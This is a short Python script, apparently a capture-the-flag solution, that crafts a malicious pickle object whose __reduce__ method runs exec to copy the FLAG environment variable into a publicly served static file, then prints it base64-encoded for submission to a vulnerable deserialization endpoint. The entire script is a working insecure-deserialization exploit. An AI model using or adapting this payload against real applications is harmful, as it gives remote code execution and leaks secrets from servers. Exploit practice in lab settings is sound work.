import pickle, base64, subprocess, os


class Payload(object):
    def __reduce__(self):
        return (exec, ("open('/app/static/flag.txt', 'w').write(__import__('os').environ.get('FLAG'))",))
deserialized_data = pickle.dumps(Payload()) # serializing data
deserialized_data = base64.b64encode(deserialized_data).decode()
print(deserialized_data)
#print(__import__('os').environ.get('FLAG'))